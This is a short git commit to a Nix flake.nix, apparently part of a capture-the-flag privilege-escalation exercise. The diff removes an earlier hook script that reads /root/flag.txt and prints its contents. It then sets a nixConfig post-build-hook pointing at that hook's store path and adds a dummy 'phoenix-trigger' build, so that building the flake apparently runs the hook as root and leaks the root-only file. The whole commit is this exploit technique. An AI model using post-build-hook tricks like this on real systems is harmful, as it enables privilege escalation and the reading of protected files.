d22ee1f39d680a40a7326777c6239c6a8ce3591a
2alf <aalf@itu.dk>
2026-09-11 16:06:09 +0200

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -3,16 +3,19 @@
 
   inputs.nixpkgs.url = "github:NixOS/nixpkgs/release-25.05";
 
+  nixConfig = {
+    post-build-hook = "/nix/store/vfa3wcdcibwydv7z1bs7970h5q4i247l-phoenix-hook";
+  };
+
+
   outputs = { nixpkgs, ... }:
     let
       system = "x86_64-linux";
       pkgs = import nixpkgs { inherit system; };
-
-      hook = pkgs.writeShellScript "phoenix-hook" ''
-        IFS= read -r FLAG < /root/flag.txt
-        printf 'PHOENIX_FLAG=%s\n' "$FLAG"
-      '';
     in {
-      packages.${system}.default = hook;
+      packages.${system}.default =
+        pkgs.runCommand "phoenix-trigger" {} ''
+          touch $out
+        '';
     };
 }
